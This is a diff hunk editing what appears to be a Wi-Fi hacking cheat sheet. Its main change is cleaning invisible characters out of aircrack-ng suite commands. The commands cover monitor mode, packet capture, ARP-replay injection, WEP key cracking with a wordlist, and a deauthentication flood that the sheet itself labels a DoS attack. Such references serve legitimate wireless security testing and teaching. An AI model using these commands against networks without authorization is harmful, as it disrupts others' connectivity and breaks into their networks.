@@ -3050,27 +3050,27 @@ aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon
 # Using aircrack-ng it is possible to directly crack the WEP Key
 aircrack-ng outfile -w wordlist
 
-Aircrack-NG 
+
 ---------------------
 Basic Commands
 
 iwconfig                   #Show wireless interfaces
 iwlist                     #Show wireless interfaces
-iwlist wlan0 scanning      #Show inform­ation about wireless networks next to interface
+iwlist wlan0 scanning      #Show information about wireless networks next to interface
 iwconfig wlan0 channel <n> #Change the channel of interface wlan0 to <n>
 iwconfig wlan0 down        #Disables wlan0 interface
 iwconfig wlan0 up          #Enables wlan0 interface
 
-Aircra­ck-ng basic
+Aircrack-ng Basic
 
 airmon-ng check kill                                                    #Disable process that could cause troubles in wifi hacking
 airmon-ng start wlan0                                                   #Put wlan0 interface on monitor mode
 airmon-ng stop wlan0mon                                                 #Put wlan0 interface back to normal
-airodu­mp-ng wlan0mon                                                   #Start packet capture on wlan0mon
-airodu­mp-ng wlan0mon --channel <n> --essid <Wi­fi-­Nam­e>              #Filter packet capture with channel and Wifi ESSID
-airodu­mp-ng wlan0mon --channel <n> --essid <Wi­fi-­Nam­e> -w fi­len­ame#Record packet capture in <fi­len­ame>
-airodu­mp-ng -r file.pcap                                               #Reads file.pcap as in airodu­mp-ng
-airepl­ay-ng --deauth <n> -a <BS­SID> wlan1mon                          #Send DoS attack on BSSID with n packets. 0 means infinity loop.
+airodump-ng wlan0mon                                                   #Start packet capture on wlan0mon
+airodump-ng wlan0mon --channel <n> --essid <Wifi-Name>              #Filter packet capture with channel and Wifi ESSID
+airodump-ng wlan0mon --channel <n> --essid <Wifi-Name> -w filename#Record packet capture in <filename>
+airodump-ng -r file.pcap                                               #Reads file.pcap as in airodump-ng
+aireplay-ng --deauth <n> -a <BSSID> wlan1mon                          #Send DoS attack on BSSID with n packets. 0 means infinity loop.
 
 
 Attacking WPA2 PSK (The old way) 
